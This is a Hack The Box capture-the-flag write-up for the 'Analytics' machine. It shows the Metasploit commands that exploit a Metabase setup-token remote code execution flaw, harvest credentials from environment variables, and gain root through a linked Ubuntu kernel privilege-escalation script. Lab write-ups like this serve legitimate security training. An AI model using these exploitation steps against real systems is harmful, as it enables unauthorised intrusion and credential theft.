---
title: "Analytics"
category: ["HTB", "Machines", "Analytics"]
---

# Analytics

- We run nmap as usual  
- ![Pasted image 20240306203043](/VaultSite/wiki-images/Pasted%20image%2020240306203043.png)  
- Add the IP and domain name to /etc/hosts with `echo "ip_machine machine_name" | sudo tee -a /etc/hosts`  
![Pasted image 20240306203205](/VaultSite/wiki-images/Pasted%20image%2020240306203205.png)  
- We see it has a subpage for registration, so we add it to the /etc/hosts file  
	- On Google, we search for possible exploits related to Metabase and find this Remote Code Execution exploit [[CVE]]  
- The exploit tells us that the first step is to retrieve the setup token by navigating to [http://vulnerablehost.com/api/session/properties](http://vulnerablehost.com/api/session/properties), which will give us the setup token  
- ![Pasted image 20240306204536](/VaultSite/wiki-images/Pasted%20image%2020240306204536.png)  
- Token  
- ![Pasted image 20240306204551](/VaultSite/wiki-images/Pasted%20image%2020240306204551.png)  
- We execute these commands to access the Metasploit console:  
  - **msfconsole**  
**search metabase**  
**use exploit/linux/http/metabase_setup_token_rce**  
**show options**  
![Pasted image 20240306211126](/VaultSite/wiki-images/Pasted%20image%2020240306211126.png)  
- **set rhosts data.analytical.htb**  
**set lhost ip**  
**set rport 80**  
**run**  
- These commands configure the options before exploitation to point to us  
- We execute the exploit with `exploit` or `run`  
- ![Pasted image 20240306212008](/VaultSite/wiki-images/Pasted%20image%2020240306212008.png)  
- With the `env`, we can now view the credentials  
- We can now access via SSH with `ssh metalytics@analytical.htb`. Once inside the SSH server, we run `ls` and find the user flag  
- Now it's time to escalate privileges to gain root access  
- We run `uname -a` and see that this version has an exploit  
- ![Pasted image 20240311212703](/VaultSite/wiki-images/Pasted%20image%2020240311212703.png)  
- https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh?source=post_page-----8cf81fa970ca--------------------------------  
- Next, we create the exploit on our machine  
- We start with `cd ../../tmp`  
- Then use `nano exploit.sh` to view and edit it  
- ![Pasted image 20240311213109](/VaultSite/wiki-images/Pasted%20image%2020240311213109.png)  
- We run `./exploit.sh` to execute it  
- ![Pasted image 20240311213242](/VaultSite/wiki-images/Pasted%20image%2020240311213242.png)  
- And indeed, we are now root. All that remains is to find the flag and copy it  
- ![Pasted image 20240311213424](/VaultSite/wiki-images/Pasted%20image%2020240311213424.png) 
